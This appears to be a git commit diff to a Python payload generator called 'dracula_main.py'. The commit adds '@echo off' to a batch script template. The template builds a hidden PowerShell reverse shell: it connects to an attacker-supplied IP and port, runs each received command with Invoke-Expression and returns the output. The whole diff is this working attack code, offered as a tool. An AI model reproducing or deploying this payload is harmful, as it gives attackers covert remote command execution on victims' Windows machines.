30bbea6cb90164acca2bd2543f671579f7012593
chet-ag09 <you@example.com>
2025-03-06 14:59:46 +0530

    forgot the echo off

--- Main/dracula_main.py
+++ Main/dracula_main.py
@@ -1,7 +1,7 @@
 import socket
 
 def generate_payload_ps(ip, port, output_file):
-    batch_script_ps = f"""
+    batch_script_ps = f"""@echo off
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
 """
     return batch_script_ps
